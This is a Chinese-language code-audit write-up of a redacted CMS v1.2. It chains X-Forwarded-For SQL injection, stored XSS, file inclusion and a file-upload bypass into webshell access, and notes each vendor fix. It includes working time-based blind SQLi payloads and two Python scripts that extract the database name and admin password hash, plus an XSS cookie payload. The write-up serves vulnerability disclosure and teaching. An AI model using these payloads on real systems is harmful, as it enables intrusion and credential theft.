0x00 前言
=======

记之前对某cms v1.2版本的代码审计，到现在已经更新了几个版本，本文提到的漏洞在最新版中均已修复。基于安全披露原则，对cms进行打码处理。

0x01 前台SQL注入
============

发现前台功能点有一处在线留言  
![image-20220415114841872.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-6d8b6c2fa9fecfa2b1a65281b5870c35fe9de9d4.png)  
对应源码处，看到会记录ip  
![image-20220415115012775.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-ca3dbda25e38c6d7295ee0ed3e4cb233e1886e80.png)

跟进`getIP()`方法，发现会从 xff 请求头获取 ip，存在一个ip伪造的问题，同时这里没有过滤

![image-20220415115112794.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-d111c2e867599979b4dd8b2d788136123fabf513.png)

接着通过`mysql::insert($data, 'feedback')`最终会被插入数据库中，我们打个断点跟一下  
![image-20220415115337405.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-798759b4a808db3bc126506b77e504e4b7184be2.png)

发送数据包，指定xff为：`127.0.0.1'`  
![image-20220415122137551.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-2130df0125615a810ea88da65256061e64125b56.png)

可以看到`127.0.0.1'`最终拼接到了 insert语句中插入数据库，造成SQL注入漏洞  
![image-20220415122842903.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-c91fe55ba8af0958430e788152ebb590d6a73fc3.png)

不过因为这里只会返回`提交失败`或者`提交成功`，没有回显，我们使用时间盲注来获取数据库中数据  
构造payload：`127.0.0.1',sleep(5),'1')#`  
![image-20220415123334761.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-18746a5dc887ab99552c7174da2f4c3d6431d48f.png)

延时五秒成功，获取数据库名长度  
![image-20220415123647317.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-1417e7cc7c2d879ea369ec6b0588a8802826fbe9.png)

编写脚本获取数据库名

```py
#-- coding:UTF-8 --
# Author:dota_st
# Date:2022/4/15 12:38
# blog: www.wlhhlc.top
import requests
import time

url = "http://192.168.1.103:80/api/feedback/"
dict = "0123456789abcdefghijklmnopqrstuvwxyz{}-"

data = "-----------------------------22936092383923055377108790415\r\nContent-Disposition: form-data; name=\"items\"\r\n\r\n58\r\n-----------------------------22936092383923055377108790415\r\nContent-Disposition: form-data; name=\"params1\"\r\n\r\nadmin\r\n-----------------------------22936092383923055377108790415\r\nContent-Disposition: form-data; name=\"params2\"\r\n\r\nadmin\r\n-----------------------------22936092383923055377108790415\r\nContent-Disposition: form-data; name=\"params3\"\r\n\r\nadmin@qq.com\r\n-----------------------------22936092383923055377108790415\r\nContent-Disposition: form-data; name=\"params4\"\r\n\r\nadmin\r\n-----------------------------22936092383923055377108790415\r\nContent-Disposition: form-data; name=\"params5\"\r\n\r\nadmin\r\n-----------------------------22936092383923055377108790415--\r\n"
flag = ""

for i in range(1,50):
    for j in dict:
        xff = f"127.0.0.1',sleep(if((substr((select database()),{i},1)=\"{j}\"),3,0)),'1')#"
        print(xff)
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------22936092383923055377108790415", "X-Forwarded-for": xff, "Connection": "close", "Referer": "http://192.168.1.103/feedback/", "Upgrade-Insecure-Requests": "1"}
        start = time.time()
        requests.post(url, headers=headers, data=data)
        end = time.time()
        if end - start > 2.8:
            flag += j
            print(flag)
            break
print("result："+flag)
```

![image-20220415133259565.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-93edf84f1c5b2c6cf5cf3174ca1200279b269923.png)

获取管理员密码

```py
#-- coding:UTF-8 --
# Author:dota_st
# Date:2022/4/15 12:38
# blog: www.wlhhlc.top
import requests
import time

url = "http://192.168.1.103:80/api/feedback/"
dict = "0123456789abcdefghijklmnopqrstuvwxyz{}-"

data = "-----------------------------22936092383923055377108790415\r\nContent-Disposition: form-data; name=\"items\"\r\n\r\n58\r\n-----------------------------22936092383923055377108790415\r\nContent-Disposition: form-data; name=\"params1\"\r\n\r\nadmin\r\n-----------------------------22936092383923055377108790415\r\nContent-Disposition: form-data; name=\"params2\"\r\n\r\nadmin\r\n-----------------------------22936092383923055377108790415\r\nContent-Disposition: form-data; name=\"params3\"\r\n\r\nadmin@qq.com\r\n-----------------------------22936092383923055377108790415\r\nContent-Disposition: form-data; name=\"params4\"\r\n\r\nadmin\r\n-----------------------------22936092383923055377108790415\r\nContent-Disposition: form-data; name=\"params5\"\r\n\r\nadmin\r\n-----------------------------22936092383923055377108790415--\r\n"
flag = ""

for i in range(1,50):
    for j in dict:
        #xff = f"127.0.0.1',sleep(if((substr((select database()),{i},1)=\"{j}\"),3,0)),'1')#"
        xff = f"127.0.0.1',sleep(if((substr((select password from cms.xxcms_manager where id=1),{i},1)=\"{j}\"),3,0)),'1')#"
        print(xff)
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------22936092383923055377108790415", "X-Forwarded-for": xff, "Connection": "close", "Referer": "http://192.168.1.103/feedback/", "Upgrade-Insecure-Requests": "1"}
        start = time.time()
        requests.post(url, headers=headers, data=data)
        end = time.time()
        if end - start > 2.8:
            flag += j
            print(flag)
            break
print("result："+flag)
```

![image-20220415152305734.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-13bf6c2cdc64f62874bea0bf6bd036f3e0a1b03b.png)

拿去cmd5解密之后进入后台

最新版修复是加了一个正则判断  
![image-20220415165351532.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-c36e26e286543dc2ec8e099111ec9018170c51d9.png)

0x02 前台存储型XSS漏洞
===============

同时前台在线留言功能没有进行过滤，可以直接写入xss代码  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-eed26fb45d270be658d5bbef7a874f6883e555c0.png)

提交之后，直接插入了数据库中  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-e87e782e9afef9a641a0818747737d9d533a77fd.png)

当管理员打开反馈管理列表查看留言时，会从数据库中取出我们构造的xsspayload,进行xss攻击

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-2c45a652bb70e7925d2f4faf6ede63e2a553057e.png)  
可以直接获取管理员cookie：`<script>alert(document.cookie)</script>`

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-a42f508b9fe3f479416655f1f6d9901c54e17658.png)

0x03 文件包含漏洞
===========

看到这个主题配置功能点的数据（模板标题，模板描述等）之前没有在数据库中见到  
![image-20220415152652474.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-aba341d7de50342d17b513d80bbcd8166e4ab2e5.png)

全局搜索了一下发现数据存放在主题模板目录下的`config.json`文件中  
![image-20220415153222067.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-269fcb997312e92a1a8febe974f215b3c8274055.png)

想到是应该包含了这个 json 文件，在源码中找了一下  
![image-20220415153340701.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-2091a2e3745d963fb59c7dba5839b966a4759aa0.png)

跟进`load_json()`  
![image-20220415153445999.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-8f5f69f33d65618908ca32245aaa2ffda170aa5b.png)

看到调用了`json::get($file)`，继续跟  
![image-20220415153546173.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-7770b23b425425bfe071bc906b66d22963f6f8f5.png)

确定是调用了`require`函数进行包含。接下来的思路就是找可以修改`config.json`文件的功能点。找了一圈才发现该 cms 提供了一个在线插件进行修改(插件只能从官方提供的插件市场进行下载)，我在写本文的时候，官方已经将该插件升级到了 V1.1，已经不适配 cmsV1.2 版本(下面会说明)  
![image-20220415153922384.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-1cf69124ba6db31b89580807edac02ab4325c8f6.png)

安装完成后，就可以点击修改对`config.json`文件进行修改  
![image-20220415154429381.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-fa1e34a1df85cbf08a7961d738f58464da89657b.png)

![image-20220415154536462.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-78c0f60edeb559242162639d1a0986330308adff.png)

当然直接修改会报错，因为在插件V1.1版本中的方法命名做了修改  
![image-20220415154617730.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-20de777d850397ebab43f43bcce1430b72971934.png)

![image-20220415154745919.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-3f02a17ef608ad5a695480200e4572c5b0780fcb.png)

v1.1插件版本对应的是最新版的cms源码，在最新cms版本中该处代码命名为`delSlashes()`  
![image-20220415154916176.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-712ddd57f66548f9645507f8201e08a75bcda0af.png)

而cmsV1.2版本源码没有`delSlashes()`方法导致报错，而是命名为`delFilter()`  
![image-20220415155042663.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-d431cdf17b39cc19db2eb0633125cc5bdf4a80c1.png)

我们做一下修改，回滚插件代码为对应的v1.2时的情况复现当时情景

可以正常对`config.json`文件进行修改之后

![image-20220415155703717.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-352cff5e8f35b0032e1e90eecfd22fb693f57be5.png)

![image-20220415155452586.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-29525c4af90a5c72c52e79cac3db57f43bc686fa.png)

成功包含并且执行 php 代码  
![image-20220415155726081.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-b09dc4812312100db83f6cadb3a93bce34ac36e6.png)

写入webshell  
![image-20220415160342873.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-9b9bc025226af7397180ed4fef2ccb956f8c0158.png)

![image-20220415160445584.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-b25b388d8b2b6a83a043890d49df676596e4de6c.png)

在最新版本中的修复方法是使用了`htmlspecialchars()`函数将`<、>`实体化编码成`&lt;&gt;`  
![image-20220415165153948.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-e5ec07c4de02dc9a7c1fd380761d119c7dc1e212.png)

0x04 文件上传漏洞
===========

前面的文件包含因为插件更新的缘故，所以现在无法利用。继续寻找别的漏洞点

看到一个 ueditor 编辑器，尝试附件上传 php一句话木马失败  
![image-20220415160732720.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-3ee57c3d7218be41eebd75109a2f28510fd236a1.png)

找到对应源码  
![image-20220415161009873.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-0144b73b8e05b002b59c98122cc50ce2cf93d899.png)

关键判断为

```php
upload::files($file, $this->config['filePathFormat'], 'code|zip|word|excel|powerpoint|audio|text|pdf'
```

跟进`upload`类的`files`方法，一共有两个关键判断

![image-20220415163035310.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-e3ad39e69add276f3d6c59f7e69080175d79acb8.png)

首先看判断一，判断文件后缀在不在`$type`列表里对应的后缀，而前面我们传进来的`$type=code|zip|word|excel|powerpoint|audio|text|pdf`中，code对应的后缀列表是含有`.php`的  
![image-20220415163202396.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-706e640f3a7fb02889ce4dcc428e1501c4f9c3fc.png)

接着看判断二，判断文件后缀在不在`$extension`数组中  
![image-20220415163344929.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-e685817fa6157a517176c33a54201f96100fcdbb.png)

`$extension`数组是从数据库表中取出，没有`.php`导致文件上传失败  
![image-20220415163449486.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-c0673a75c67054cc30985bddf57630067ccd4e72.png)

知道了原因之后我们开始找可以修改数据库中表的功能点，最后发现有个文件上传类型可以直接更改  
![image-20220415163631858.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-5f68babeef8f8c8c2dda23d2a3f02fb9784aa53e.png)

添加上`.php`后缀保存，再上传  
![image-20220415163718064.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-6d6e12fd8f8b5276b8593abeb94e58259d1fa968.png)

成功上传webshell  
![image-20220415163807573.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-bf4f782c7e9f63bfc02f0ccbcfb2b02fe7987e5b.png)

最新版修复办法是将`$type`参数的内容改成了`null`  
![image-20220415165515104.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-31b24df87fe105a2c7c45396d3b01f13d1b93eca.png)

0x05 总结
=======

审计下来，漏洞组合凑成了一条从前台进行 getshell 的链子，现在去看修复方法也能学到其他思路，算是一次不错的审计经历。